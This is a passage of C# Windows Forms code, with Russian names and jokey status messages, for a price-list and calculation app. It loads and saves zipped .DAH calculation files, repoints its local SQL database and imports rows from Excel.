                pictureBox_Raz.Image = pictureBox_Raz1.Image;




            }
            else
            {
                dataGridView_расчёт_2.Rows.Clear();
                dataGridView_зависимость.Rows.Clear();
                label_rachetka.Text = "Расчетка: Новая";
                textBox_P_S.Text = "";
                pictureBox_Raz.Image = pictureBox_Raz1.Image;
            }















        }

        private void загрузитьРасчетToolStripMenuItem_Click(object sender, EventArgs e)
        {
            otclehivat_polzovatelia = false;
            label_consol_2.Text = "Попытка вставить говницо!";

            OpenFileDialog open_dialog = new OpenFileDialog(); //создание диалогового окна для выбора файла
            if (setting[22] != null && setting[22] != "") open_dialog.InitialDirectory = setting[22];
            open_dialog.Filter = "Расчет (.DAH)|*.DAH"; //формат загружаемого файла
            if (open_dialog.ShowDialog() == DialogResult.OK) //если в окне была нажата кнопка "ОК"
            {
                string put_k_arhiv;
                string put_k_papke;
                string put_k_arhiv_zav;

                string имя_файла = open_dialog.SafeFileName;

                string gie = open_dialog.FileName;


                string путь = gie.Remove(gie.Length - имя_файла.Length, имя_файла.Length);

                //try { Directory.Delete(@путь + "\\tempDH", true); } catch { }
                Directory.CreateDirectory(путь + "\\tempDH");
                //имя_файла.Length         
                //text = text.Substring(0, text.Length - 2);



                //1) распоковывае архив
                using (ZipFile zip1 = new ZipFile(open_dialog.FileName, Encoding.GetEncoding(866)))
                {
                    //создаем путь для сохранения
                    char[] MyChar = { '.', 'D', 'A', 'H', ' ' };
                    string Directory1 = open_dialog.FileName.TrimEnd(MyChar);
                    put_k_papke = Directory1;
                    System.IO.FileInfo obj = new System.IO.FileInfo(open_dialog.FileName); // получаем имя afqkf

                    string name_file = obj.Name.TrimEnd(MyChar);// имя файла без пути! 


                    // put_k_arhiv = Directory1 + "\\" + name_file + ".DAH";
                    //put_k_arhiv_zav = Directory1 + "\\_" + name_file + ".DAH";
                    try { zip1.ExtractAll(Environment.ExpandEnvironmentVariables(@путь + "\\tempDH")); } catch { MessageBox.Show("Рядом с файлом лежит папка с таким же именем ! Удали её и попробуй заново! \n Код ошибки: 002 \nНе смогла распаковать файл по пути: \n" + @путь + " пыталась создать папку \\tempDH"); }
                }

                try
                {
                    string[] все_распок_папки = Directory.GetDirectories(@путь + "\\tempDH"); // путь к папке
                    string papka_c_rasp = все_распок_папки[0];

                    string fdfd12 = путь + "\\tempDH";
                    int fdfd = fdfd12.Length;
                    string путь1 = papka_c_rasp.Substring(fdfd + 1);

                    put_k_arhiv = papka_c_rasp + "\\" + путь1 + ".DAH";
                    put_k_arhiv_zav = papka_c_rasp + "\\_" + путь1 + ".DAH";
                    string put_k_arhiv_PS = papka_c_rasp + "\\_PS_" + путь1 + ".DAH";
                    dataGridView_расчёт_2.Rows.Clear();
                    dataGridView_зависимость.Rows.Clear();
                    textBox_P_S.Text = "";
                    //примечание                   
                    // открываем файл
                    using (StreamReader stream = new StreamReader(put_k_arhiv_PS))
                    {
                        while (stream.Peek() >= 0)
                        {
                            // читаем строку из файла
                            textBox_P_S.Text = stream.ReadLine();
                        }
                        stream.Close();
                    }


                    //грузим основное
                    using (BinaryReader bw = new BinaryReader(File.Open(put_k_arhiv, FileMode.Open)))
                    {
                        int n = bw.ReadInt32();
                        int m = bw.ReadInt32();
                        for (int i = 0; i < m; ++i)
                        {
                            if (i == m)
                            {
                            }
                            if (i < m)
                            {
                                dataGridView_расчёт_2.Rows.Add();
                            }
                            for (int j = 0; j < n; ++j)
                            {
                                if (bw.ReadBoolean())
                                {
                                    if (j != 4) { dataGridView_расчёт_2.Rows[i].Cells[j].Value = bw.ReadString(); }
                                    else
                                    {
                                        string vfsd = bw.ReadString();
                                        try
                                        {
                                            //сюда..
                                            System.Drawing.Image img;
                                            using (var bmpTemp = new Bitmap(@papka_c_rasp + "\\" + i.ToString() + ".jpg"))
                                            {
                                                img = new Bitmap(bmpTemp);
                                            }
                                            dataGridView_расчёт_2.Rows[i].Cells[j].Value = img;
                                        }
                                        catch { }
                                    }
                                }
                                else { bw.ReadBoolean(); }
                            }
                        }
                    }
                    ////грузим зависимости
                    using (BinaryReader bw = new BinaryReader(File.Open(put_k_arhiv_zav, FileMode.Open)))
                    {
                        int n = bw.ReadInt32();
                        int m = bw.ReadInt32();
                        for (int i = 0; i < m; ++i)
                        {
                            if (i == m)
                            {
                            }
                            if (i < m)
                            {
                                dataGridView_зависимость.Rows.Add();
                            }
                            for (int j = 0; j < n; ++j)
                            {
                                if (bw.ReadBoolean())
                                {
                                    dataGridView_зависимость.Rows[i].Cells[j].Value = bw.ReadString();
                                }
                                else { bw.ReadBoolean(); }
                            }
                        }
                    }

                    try { Directory.Delete(@путь + "\\tempDH", true); } catch { }



                    int nr, nc;
                    nc = dataGridView_расчёт_2.Columns.Count; // количество столбцов
                    nr = dataGridView_расчёт_2.RowCount;
                    if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.RowCount - 2].Cells[6].Value != null || dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.RowCount - 2].Cells[7].Value != null) { }
                    else
                    {
                        if ((nc > 0) && (nr > 1))
                        {
                            dataGridView_расчёт_2.Rows.RemoveAt(nr - 2);

                        }
                    }
                    try
                    {
                        int nr1;
                        nr1 = dataGridView_зависимость.RowCount - 1;
                        //       dataGridView_зависимость.Rows.RemoveAt(nr1 - 1);
                    }
                    catch { }
                    if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0].Value == null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[1].Value == null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[2].Value == null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[3].Value == null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[5].Value == null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[6].Value != null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[7].Value != null
                      )
                    {
                        string itigo = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[6].Value.ToString();
                        string thena = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[7].Value.ToString();
                        int nr33, nc33;
                        nc33 = dataGridView_расчёт_2.Columns.Count; // количество столбцов
                        nr33 = dataGridView_расчёт_2.RowCount;
                        if ((nc33 > 0) && (nr33 > 1))
                        {
                            dataGridView_расчёт_2.Rows.RemoveAt(nr33 - 2);
                        }
                        else
                        {
                        }
                        dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[6].Value = itigo;
                        dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[7].Value = thena;
                    }
                    else
                    {
                    }
                    if (dataGridView_расчёт_2.RowCount - 1 > 0)
                    {
                        for (int x = 0; x < dataGridView_зависимость.RowCount - 1; x++)
                        {
                            string id = null;
                            try { id = dataGridView_зависимость.Rows[x].Cells[4].Value.ToString(); } catch { }

                            if (id != null)
                            {
                                for (int a = 0; a < dataGridView_расчёт_2.NewRowIndex; a++)
                                {
                                    string idd = null;
                                    try
                                    {
                                        idd = dataGridView_расчёт_2.Rows[a].Cells[8].Value.ToString();
                                    }
                                    catch { }
                                    if (id == idd)
                                    {
                                        dataGridView_расчёт_2.Rows[a].Cells[0].Style.BackColor = Color.Wheat;
                                    }
                                }
                            }
                        }
                    }
                    try
                    {
                        ///
                        if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8] != null)
                        {
                            dataGridView_муляж.Rows.Clear();
                            string dsd = null;
                            try { dsd = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value.ToString(); } catch { }

                            if (dsd != null)
                            {
                                int nomber = 1;
                                for (int a = 0; a < dataGridView_зависимость.Rows.Count - 1; a++)
                                {
                                    if (dsd == dataGridView_зависимость.Rows[a].Cells[4].Value.ToString())
                                    {
                                        dataGridView_муляж.Rows.Add(nomber.ToString(), dataGridView_зависимость.Rows[a].Cells[0].Value, dataGridView_зависимость.Rows[a].Cells[1].Value, dataGridView_зависимость.Rows[a].Cells[2].Value, dataGridView_зависимость.Rows[a].Cells[3].Value);
                                        nomber++;
                                    }
                                }
                            }
                            else { dataGridView_муляж.Visible = false; groupBox7.Visible = false; }
                        }////
                    }
                    catch { }
                    label_consol_2.Text = "Загружена расчетка";
                    label_rachetka.Text = "Расчет: " + open_dialog.FileName;
                    razhet_label.Visible = true;//требуется расчёт

                    //запоминаем колличество и цену! 
                    decimal цена = 0;
                    int koll = 0;
                    for (int i = 0; i < dataGridView_расчёт_2.NewRowIndex; i++)
                    {
                        try
                        {
                            decimal fr = 0;
                            bool isDecimal1 = Decimal.TryParse(dataGridView_расчёт_2.Rows[i].Cells[7].Value.ToString(), out fr);
                            if (isDecimal1 == true) { цена = цена + fr; }
                        }
                        catch { }
                        try
                        {
                            int r = Convert.ToInt16(dataGridView_расчёт_2.Rows[i].Cells[6].Value.ToString());
                            koll = koll + r;
                        }
                        catch { }
                    }

                    has_the_price_changed = цена;
                    has_the_calculation_of_the_quantity_changed = koll;

                    //пробуем закрасить раздел! 
                    for (int a = 0; a < dataGridView_расчёт_2.NewRowIndex; a++)
                    {
                        string е5 = null;
                        string е6 = null;
                        string е7 = null;
                        try
                        {
                            е5 = dataGridView_расчёт_2.Rows[a].Cells[5].Value.ToString();
                        }
                        catch { }
                        try
                        {
                            е6 = dataGridView_расчёт_2.Rows[a].Cells[6].Value.ToString();
                        }
                        catch { }
                        try
                        {
                            е7 = dataGridView_расчёт_2.Rows[a].Cells[7].Value.ToString();
                        }
                        catch { }
                        if (е5 == null && е6 == null && е7 == null)
                        {  //dataGridView_Заказ[w, q].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
                           // dataGridView_расчёт_2.Rows[a].Cells[0].Style.BackColor = Color.Wheat;

                            for (int i = 0; i < 8; i++)
                            {
                                dataGridView_расчёт_2.Rows[a].Cells[i].Style.BackColor = Color.PowderBlue;
                            }
                            dataGridView_расчёт_2.Rows[a].Cells[10].Style.BackColor = Color.PowderBlue;

                        }
                    }

                }
                catch
                {
                    DialogResult rezult = MessageBox.Show("Невозможно открыть выбранный файл",
                    "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    label_consol_2.Text = "Неполучилось вставить таблицу! бывает.";
                }
            }
            else { label_consol_2.Text = "Передумал всталять.. Ну и ладно!"; }
            this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;
            otclehivat_polzovatelia = true;
        }

        int xaxa = 0;
        private void сохранитьРасчетToolStripMenuItem_Click(object sender, EventArgs e)
        {
            otclehivat_polzovatelia = false;
            label_consol_2.Text = "Попытка с%:&ть данные с таблицы.. :)";
            if (dataGridView_расчёт_2.NewRowIndex == 0)
            {
                if (xaxa == 0) { label_consol_2.Text = "Серьёзно? Нечего сохранять!!"; xaxa++; } else { xaxa++; label_consol_2.Text = "Оцепись от этой кнопки!!!"; if (xaxa > 2) { xaxa = 0; } }
            }
            else
            {
                if ( dataGridView_расчёт_2.NewRowIndex == 1) { label_consol_2.Text = "Запомни в уме! :) Запиши на листик!"; }
                else
                {
                    SaveFileDialog saveFileDialog1 = new SaveFileDialog(); //создание диалогового окна для выбора файла
                    if (setting[23] != null && setting[23] != "") saveFileDialog1.InitialDirectory = setting[23];
                    saveFileDialog1.Filter = "Расчет (.DAH)|*.DAH"; //формат загружаемого файла
                    try
                    {
                        if (saveFileDialog1.ShowDialog() == DialogResult.Cancel)
                        {
                            label_consol_2.Text = "Передумал сохранять.. Ты хоть сам знашь, что хочешь?";
                            return;
                        }
                        // получаем выбранный файл
                        string filename = saveFileDialog1.FileName;
                        System.IO.FileInfo obj = new System.IO.FileInfo(saveFileDialog1.FileName); // получаем имя
                        ActiveForm.Text = obj.Name; //  obj.Name - это имя файла
                        char[] MyChar = { '.', 'D', 'A', 'H', ' ' };
                        string Directory1 = filename.TrimEnd(MyChar); // путь к папке
                        System.IO.Directory.CreateDirectory(Directory1); // создаем папку! с именем файла
                        string name_file = obj.Name.TrimEnd(MyChar);// имя файла без пути! 
                        string name_file_put = Directory1 + "\\" + obj.Name;
                        string name_file_zav = Directory1 + "\\_" + obj.Name;

                        //Примечание
                        string name_file_PS = Directory1 + "\\_PS_" + obj.Name;
                        try
                        {
                            // System.IO.File.Create(name_file_PS);
                            FileStream fileStream = File.Open(name_file_PS, FileMode.Create);
                            // получаем поток
                            StreamWriter output = new StreamWriter(fileStream);
                            // записываем текст в поток
                            if (textBox_P_S.Text != null && textBox_P_S.Text != "")
                            { output.Write(textBox_P_S.Text); }
                            else { output.Write(""); }
                            // закрываем поток
                            output.Close();
                        }
                        catch { }

                        //2)сохраняем основные данные
                        using (BinaryWriter bw = new BinaryWriter(File.Open(name_file_put, FileMode.Create)))
                        {
                            bw.Write(dataGridView_расчёт_2.Columns.Count);
                            bw.Write(dataGridView_расчёт_2.Rows.Count);
                            foreach (DataGridViewRow dgvR in dataGridView_расчёт_2.Rows)
                            {
                                for (int j = 0; j < dataGridView_расчёт_2.Columns.Count; ++j)
                                {
                                    object val = dgvR.Cells[j].Value;
                                    if (val == null)
                                    {
                                        bw.Write(false);
                                        bw.Write(false);
                                    }
                                    else
                                    {
                                        bw.Write(true);
                                        bw.Write(val.ToString()); //bw.Write(val.ToString());
                                        if (val.ToString() != "System.Drawing.Bitmap") //если текст
                                        {
                                            Bitmap img = dataGridView_расчёт_2.Rows[dgvR.Index].Cells[4].Value as Bitmap;
                                            if (img != null)
                                            {
                                                if (dataGridView_расчёт_2.NewRowIndex != dgvR.Index)
                                                {
                                                    PictureBox asa = new PictureBox();
                                                    asa.Image = img;
                                                    asa.Image.Save(Directory1 + "\\" + dgvR.Index.ToString() + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                                                }
                                                else
                                                {
                                                    if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[0].Value == null
                                                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[1].Value == null
                                                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[2].Value == null
                                                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[3].Value == null
                                                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[5].Value == null
                                                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[6].Value != null
                                                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[7].Value != null
                                                      )
                                                    {
                                                    }
                                                    else
                                                    {
                                                        PictureBox asa = new PictureBox();
                                                        asa.Image = img;
                                                        asa.Image.Save(Directory1 + "\\" + dgvR.Index.ToString() + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        //2)сохраняем файл зависимостей.
                        //////////////////////////
                        using (BinaryWriter bw = new BinaryWriter(File.Open(name_file_zav, FileMode.Create)))
                        {
                            bw.Write(dataGridView_зависимость.Columns.Count);
                            bw.Write(dataGridView_зависимость.Rows.Count);
                            foreach (DataGridViewRow dgvR in dataGridView_зависимость.Rows)
                            {
                                for (int j = 0; j < dataGridView_зависимость.Columns.Count; ++j)
                                {
                                    object val = dgvR.Cells[j].Value;
                                    if (val == null)
                                    {
                                        bw.Write(false);
                                        bw.Write(false);
                                    }
                                    else
                                    {
                                        bw.Write(true);

                                        switch (val.ToString())
                                        {
                                            case ("+"):
                                                bw.Write("+");
                                                break;
                                            case ("-"):
                                                bw.Write("-");
                                                break;
                                            case ("/"):
                                                bw.Write("/");
                                                break;
                                            case ("х"):
                                                bw.Write("x");
                                                break;
                                            default:
                                                bw.Write(val.ToString());
                                                break;
                                        }
                                    }
                                }
                            }
                        }
                        /////////////////


                        //3) архивация данных

                        using (ZipFile zip = new ZipFile(Encoding.GetEncoding(866)))
                        {
                            string zzz = Directory1;
                            char[] charArr = (name_file + ".DAH").ToCharArray();
                            string ddd = filename.TrimEnd(charArr);
                            string aaa = Directory1 + "\\" + name_file + ".DAH";
                            zip.AddDirectory(@Directory1, name_file);
                            zip.Save(@ddd + name_file + ".DAH");
                            try { Directory.Delete(@Directory1, true); } catch { MessageBox.Show("Я все сделала! НО Рядом с файлом создала временную папку с таким же именем ! Удали её в ручную! Без обид! Так получилось"); }

                        }
                        label_consol_2.Text = "Файл расчетки сохранен и находится:" + saveFileDialog1.FileName;
                        label_rachetka.Text = "Расчет: " + saveFileDialog1.FileName;
                        // MessageBox.Show("Файл сохранен");  
                    }
                    catch
                    {
                        DialogResult rezult = MessageBox.Show("Невозможно сохранить файл сюда",
                        "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        label_consol_2.Text = "Не смертельна, может нет доступа к папке, или не от админа сидим тут";
                    }

                    this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;
                    //запоминаем колличество и цену! 
                    decimal цена = 0;
                    int koll = 0;
                    for (int i = 0; i < dataGridView_расчёт_2.NewRowIndex; i++)
                    {
                        try
                        {
                            decimal fr = 0;
                            bool isDecimal1 = Decimal.TryParse(dataGridView_расчёт_2.Rows[i].Cells[7].Value.ToString(), out fr);
                            if (isDecimal1 == true) { цена = цена + fr; }
                        }
                        catch { }
                        try
                        {
                            int r = Convert.ToInt16(dataGridView_расчёт_2.Rows[i].Cells[6].Value.ToString());
                            koll = koll + r;
                        }
                        catch { }
                    }

                    has_the_price_changed = цена;
                    has_the_calculation_of_the_quantity_changed = koll;


                    string FileName3 = label_rachetka.Text;
                    char[] MyChar3 = { 'Р', 'а', 'с', 'ч', 'е', 'т', 'к', 'а', ':' };
                    string Directory3 = FileName3.TrimStart(MyChar3);
                    Save_history_user_work("Я создал шаблон:" + @Directory3, Directory3);














                }
            }
            otclehivat_polzovatelia = true;
        }

        private void сохранитьРасчетВPDFБезЦенToolStripMenuItem_Click(object sender, EventArgs e)
        {
            button_save_to_pdf3.PerformClick();

        }

        private void сохранитьРасчетВPDFСЦенамиToolStripMenuItem_Click(object sender, EventArgs e)
        {
            button_save_to_pdf2.PerformClick();
        }

        private void сохранитьВExcelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            button_new_ophins.PerformClick();
        }


        private void сохранитьПрайсToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                this.Validate();
                this.tableBindingSource.EndEdit();
                this.tableAdapterManager.UpdateAll(this.данные);
                label_consol.Text = "Данные сохранены";
                timer_reset_pass_save.Enabled = true; //таймер на сброс пороля!
            }
            catch
            {
                label_consol.Text = "Нет связи с базой. АА..аа."; MessageBox.Show("Утерена связь с прайсом:\n Востанови связь и нажми заново!"); обновитьЦенуСФайлаExcelToolStripMenuItem.Enabled = false; обновитьЦенуСФайлаExcelToolStripMenuItem.Enabled = false;

                изменитьНаЦенуПроизводителяToolStripMenuItem.Enabled = false;
            }



        }

        private void загрузитьПрайсToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Внимание! После выбора нового источника\nпрограмма будет перезагруженна. Полностью!\nДанные в расчетке будут стерты!\n\nЭтот пункт не обсуждается!\n\nТакавы требования SQL Server Windows NT \nТребуется занова авторизироваться на сервере!", "Предупреждение!");
            //читаем и помещаем файл в add
            string path = "rez\\load__baze.exe.config";
            string[] add = new string[20];
            int a = 0;
            using (StreamReader sr = new StreamReader(path, System.Text.Encoding.Default))
            {
                string line;

                while ((line = sr.ReadLine()) != null)
                {
                    add[a] = line;
                    a++;
                }
            }


            OpenFileDialog open_dialog = new OpenFileDialog(); //создание диалогового окна для выбора файла
            open_dialog.Filter = "Файл данных(*.MDF;)|*.MDF;|All files (*.*)|*.*"; //формат загружаемого файла
            if (open_dialog.ShowDialog() == DialogResult.OK) //если в окне была нажата кнопка "ОК"
            {
                string writePath = "load__baze.exe.config";
                string new_adress = open_dialog.FileName.ToString();
                int ct = 0;
                try
                {
                    using (StreamWriter sw = new StreamWriter(writePath, false, System.Text.Encoding.UTF8))
                    {
                        while (add[ct] != null)
                        {
                            if (ct == 5) { sw.WriteLine("        <add name=\"load__baze.Properties.Settings.connect_baza\" connectionString=\"Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=" + new_adress + ";Integrated Security=True;Connect Timeout=30\""); }
                            else { sw.WriteLine(add[ct]); }
                            ct++;
                        }

                    }
                    //перезагружаем программу целиком
                    exet = true; //убираем сообщение с вопросами.
                    System.Diagnostics.Process.Start(System.Windows.Forms.Application.ExecutablePath);
                    System.Windows.Forms.Application.Exit();
                }
                catch
                {
                    DialogResult result2 = MessageBox.Show("Нет доступа к записи файла настроек", "Че то пошло не так!", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                }
            }
        }

        private void перенестиВыделеннуюСтрокуИзРасчеткиВКонецПрайсаToolStripMenuItem_Click(object sender, EventArgs e)
        {
            bool dod = false;
            if (Baza == false) { dod = true; Baza = true; button_Baza_RACHET.Text = "РАСЧЁТ > ПРАЙС"; groupBox_baza.Visible = false; groupBox_razhet.Visible = true; }
            button_ctroky_v_bazy.PerformClick();
            if (dod == true) { Baza = false; button_Baza_RACHET.Text = "ПРАЙС > РАСЧЁТ"; groupBox_baza.Visible = true; groupBox_razhet.Visible = false; }




            //пробуем обновить поисковик: (это добавленно по просьбе Дениса, непроверенная до конца фича):

            button_добавить.Enabled = true;
            button_поиск.Enabled = false;
            groupBox_поиск.Visible = true;
            groupBox_добавить.Visible = false;

            //обновим поиск
            // загоним списокс базы. в это окно

            // 1) слижем все данные с графы производитель
            comboBox1_поиск.Items.Clear(); //чистим список 1

            naimen_proizvoditel_FULL = new string[this.tableBindingSource.Count];
            naimen_naimenovania_FULL = new string[this.tableBindingSource.Count];
            naimen_артикул_FULL = new string[this.tableBindingSource.Count];
            naimen_цена_FULL = new string[this.tableBindingSource.Count];
            for (int a = 0; a < this.tableBindingSource.Count; a++)
            {
                naimen_proizvoditel_FULL[a] = tableDataGridView[1, a].Value.ToString();
                naimen_naimenovania_FULL[a] = tableDataGridView[2, a].Value.ToString();
                naimen_артикул_FULL[a] = tableDataGridView[3, a].Value.ToString();
                naimen_цена_FULL[a] = tableDataGridView[5, a].Value.ToString();
            }

            // уберем повторы из списка производителя
            naimen_proizvoditel = naimen_proizvoditel_FULL.Distinct().ToArray();

            массив_производителей = new string[naimen_proizvoditel.Count()][]; //присвоили 3 ячейки из списка
            массив_наименования = new string[naimen_proizvoditel.Count()][];
            массив_артикул = new string[naimen_proizvoditel.Count()][];
            массив_цена = new string[naimen_цена_FULL.Count()][];


            for (int x = 0; x < naimen_proizvoditel.Count(); x++) //3 in
            {
                int k = 0;
                for (int y = 0; y < naimen_proizvoditel_FULL.Count(); y++) // 8 in
                {
                    if (naimen_proizvoditel_FULL[y] == naimen_proizvoditel[x]) { k++; }
                }
                массив_производителей[x] = new string[k];
                массив_наименования[x] = new string[k];
                массив_артикул[x] = new string[k];
                массив_цена[x] = new string[k];

            }

            for (int z = 0; z < naimen_proizvoditel.Count(); z++) // 3 in
            {
                int q = 0;
                for (int y = 0; y < naimen_proizvoditel_FULL.Count(); y++) // 8 in
                {


                    if (naimen_proizvoditel_FULL[y] == naimen_proizvoditel[z])
                    {

                        массив_производителей[z][q] = naimen_proizvoditel_FULL[y];
                        массив_наименования[z][q] = naimen_naimenovania_FULL[y];
                        массив_артикул[z][q] = naimen_артикул_FULL[y];
                        массив_цена[z][q] = naimen_цена_FULL[y];
                        q++;
                    }
                }




            }

            comboBox1_поиск.Items.AddRange(naimen_proizvoditel);
            try { comboBox1_поиск.SelectedIndex = 0; } catch { label_consol.Text = "Неудачное подключение к прайсу!"; }







        }

        private void перенестиВсеДанныеИзРасчеткиВКонецПрайсаToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //обходчик окон
            bool dod = false;
            if (Baza == false) { dod = true; Baza = true; button_Baza_RACHET.Text = "РАСЧЁТ > ПРАЙС"; groupBox_baza.Visible = false; groupBox_razhet.Visible = true; }
            button_perenos_obratno.PerformClick();
            if (dod == true) { Baza = false; button_Baza_RACHET.Text = "ПРАЙС > РАСЧЁТ"; groupBox_baza.Visible = true; groupBox_razhet.Visible = false; }



            // Добавленно по просьбе Дениса. Обновление поисковика 
            button_добавить.Enabled = true;
            button_поиск.Enabled = false;
            groupBox_поиск.Visible = true;
            groupBox_добавить.Visible = false;

            //обновим поиск
            // загоним списокс базы. в это окно

            // 1) слижем все данные с графы производитель
            comboBox1_поиск.Items.Clear(); //чистим список 1

            naimen_proizvoditel_FULL = new string[this.tableBindingSource.Count];
            naimen_naimenovania_FULL = new string[this.tableBindingSource.Count];
            naimen_артикул_FULL = new string[this.tableBindingSource.Count];
            naimen_цена_FULL = new string[this.tableBindingSource.Count];
            for (int a = 0; a < this.tableBindingSource.Count; a++)
            {
                naimen_proizvoditel_FULL[a] = tableDataGridView[1, a].Value.ToString();
                naimen_naimenovania_FULL[a] = tableDataGridView[2, a].Value.ToString();
                naimen_артикул_FULL[a] = tableDataGridView[3, a].Value.ToString();
                naimen_цена_FULL[a] = tableDataGridView[5, a].Value.ToString();
            }

            // уберем повторы из списка производителя
            naimen_proizvoditel = naimen_proizvoditel_FULL.Distinct().ToArray();

            массив_производителей = new string[naimen_proizvoditel.Count()][]; //присвоили 3 ячейки из списка
            массив_наименования = new string[naimen_proizvoditel.Count()][];
            массив_артикул = new string[naimen_proizvoditel.Count()][];
            массив_цена = new string[naimen_цена_FULL.Count()][];


            for (int x = 0; x < naimen_proizvoditel.Count(); x++) //3 in
            {
                int k = 0;
                for (int y = 0; y < naimen_proizvoditel_FULL.Count(); y++) // 8 in
                {
                    if (naimen_proizvoditel_FULL[y] == naimen_proizvoditel[x]) { k++; }
                }
                массив_производителей[x] = new string[k];
                массив_наименования[x] = new string[k];
                массив_артикул[x] = new string[k];
                массив_цена[x] = new string[k];

            }

            for (int z = 0; z < naimen_proizvoditel.Count(); z++) // 3 in
            {
                int q = 0;
                for (int y = 0; y < naimen_proizvoditel_FULL.Count(); y++) // 8 in
                {


                    if (naimen_proizvoditel_FULL[y] == naimen_proizvoditel[z])
                    {

                        массив_производителей[z][q] = naimen_proizvoditel_FULL[y];
                        массив_наименования[z][q] = naimen_naimenovania_FULL[y];
                        массив_артикул[z][q] = naimen_артикул_FULL[y];
                        массив_цена[z][q] = naimen_цена_FULL[y];
                        q++;
                    }
                }




            }

            comboBox1_поиск.Items.AddRange(naimen_proizvoditel);
            try { comboBox1_поиск.SelectedIndex = 0; } catch { label_consol.Text = "Неудачное подключение к прайсу!"; }




        }

        private void поискОдинаковыхАртикуловВПрайсеToolStripMenuItem_Click(object sender, EventArgs e)
        {
            button_поиск_копий_в_базе.PerformClick();

        }

        private void загрузкаИзExcelФайлаСДаннымиВРасчетДляПереносаВПрайсToolStripMenuItem_Click(object sender, EventArgs e)
        {


            label_consol_2.Text = "Попытка вставить говница из ексельки!";

            OpenFileDialog open_dialog = new OpenFileDialog(); //создание диалогового окна для выбора файла
            open_dialog.Filter = "Старый добрый Excel(.xlsx)|*.xlsx"; //формат загружаемого файла
            if (open_dialog.ShowDialog() == DialogResult.OK) //если в окне была нажата кнопка "ОК"
            {

                dialog_mess("Start");
                Excel.Application xlApp;
                label_consol_2.Text = "Ищу на компе Microsoft Office Excel";
                Excel.Workbook xlWorkBook;
                Excel.Worksheet xlWorkSheet;
                label_consol_2.Text = "Гружу в оперативку Microsoft Office Excel";
                Excel.Range range;
                xlApp = new Excel.Application();
                label_consol_2.Text = "Пихаю в Excel файл:" + open_dialog.FileName; //доделать
                xlWorkBook = xlApp.Workbooks.Open(open_dialog.FileName, 0, true, 5, "", "", true, Microsoft.Office.Interop.Excel.XlPlatform.xlWindows, "\t", false, false, 0, true, 1, 0);
                label_consol_2.Text = "Обхожу лиценцию Excel (кряк)";
                xlWorkSheet = (Excel.Worksheet)xlWorkBook.Worksheets.get_Item(1);
                range = xlWorkSheet.UsedRange;
                int rw = 0;
                int cl = 0;
                string str;
                int rCnt;
                int cCnt;
                rw = range.Rows.Count; //строки
                cl = range.Columns.Count; //столбцы
                int ohibki = 0;


                bool vibor_nada = false;
                int vibor_hago = 0;
                int vibor_col = 0;
                for (rCnt = 1; rCnt <= rw; rCnt++)
                {
                    dialog_mess("Взято:" + rCnt.ToString() + "/" + rw + "\n" + ((rCnt * 100) / rw).ToString() + "%");

                    dataGridView_расчёт_2.Rows.Add(); //создадим новую строку
                    for (cCnt = 1; cCnt <= cl; cCnt++)
                    {
                        try
                        {
                            try { str = (string)(range.Cells[rCnt, cCnt] as Excel.Range).Value.ToString(); } catch { str = null; }
                            if (cCnt == 1)
                            {
                                if (str == null) { ohibki++; dataGridView_расчёт_2[1, dataGridView_расчёт_2.NewRowIndex - 1].Style.BackColor = Color.FromArgb(255, 255, 20, 20); }
                                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[1].Value = str;
                            } //фирма
                            if (cCnt == 2)
                            {//наименование
                                if (str == null) { ohibki++; dataGridView_расчёт_2[2, dataGridView_расчёт_2.NewRowIndex - 1].Style.BackColor = Color.FromArgb(255, 255, 20, 20); }
                                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[2].Value = str;
                            }
                            if (cCnt == 3)
                            {//артикул
                                if (str == null) { ohibki++; dataGridView_расчёт_2[3, dataGridView_расчёт_2.NewRowIndex - 1].Style.BackColor = Color.FromArgb(255, 255, 20, 20); }
